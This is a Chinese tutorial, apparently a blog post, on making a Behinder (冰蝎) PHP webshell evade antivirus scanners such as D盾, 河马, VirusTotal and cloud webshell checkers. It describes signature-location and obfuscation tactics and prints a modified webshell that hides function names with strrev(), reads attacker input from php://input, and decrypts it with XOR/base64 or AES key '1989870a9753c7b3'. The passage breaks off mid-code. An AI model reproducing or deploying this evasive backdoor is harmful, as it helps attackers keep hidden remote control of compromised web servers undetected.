前段时间退出了内网的学习，现在开始复习web方面的漏洞了，于是乎，开始了挖洞之旅，当我像往常一样上传冰蝎的webhsell时，发现冰蝎的马子居然被杀了.......于是便有了该文章.....  
先说一下目前的免杀情况:  
D盾，河马等都零警报，  
vt全绿，  
阿里云webshell查杀安全，  
百度webshell查杀安全,  
其他等等....  
目前仅测试了这些....其他的自行测试。  
文章开始:  
首先看一下冰蝎的原版马子:
看一下原版的查杀率:
再看一下百度的接口：
阿里：
河马，D盾：
基本上都被杀软标记了....  
那么我们想用冰蝎的话，就必须要免杀了  
先说一下免杀的思路:  
对于静态免杀，主要便是混淆代码了，base64，hex，异或等等....反正思路要扩展起来，可能很多师傅是玩ctf的，我这种菜鸡没玩过.....像里面的凯撒密码....等等各种密码学的东西其实可以搬到免杀的思路上来，但是像base64等等....可能早就被杀软计入特征库了，所以用base64等简单的加密，对webshell免杀可能不太好使了,那有没有简单些的方式达到静态免杀呢？答案是肯定的....比如php的字符串逆置函数strrev()，可以将代码颠倒顺序，再在webshell里面加入注释，变量名称改改....使用一些php的魔术函数....以达到绕过杀软的静态防护。  
我们将webshell放到d盾查杀....看看到底是哪部分代码导致被查杀....[做个免杀的师傅应该都知道特征码定位技术,定位特征码,修改特征码绕过杀软]。  
这里各位师傅自己尝试吧，建议二分法尝试,或则根据自己的经验判断。  
我这里对下面部分代码进行逆值颠倒：
    <?php
    /*
    我啥也不知道.....
    sjfasaadssada
    dadadad
    */
    session_start();
        $ok="1989870a9753c7b3";//cwk
        $_SESSION['k']=$ok;
        $zyq=(strrev("stnetnoc_teg_elif"))(strrev("tupni//:php"));
        $love=15;
        if(!extension_loaded(strrev('lssnepo')))
        {
            /*
    我啥也不知道.....
    sjfasaadssada
    dadadad
    */
            $t=strrev("edoced_46esab");
            $zyq=$t($zyq."");
            /*
    我啥也不知道.....
    sjfasaadssada
    dadadad
    */
            for($i=0;$i<strlen($zyq);$i++) {
                $o= $ok[$i+1&$love]^$zyq[$i]; 
                $zyq[$i] =$o;
            }
        }
        else
        {
            $zyq=(strrev("tpyrced_lssnepo"))($zyq, "AES128", $ok);
        }
        $arr=explode('|',$zyq);
        $func=$arr[0];
        /*
    我啥也不知道.....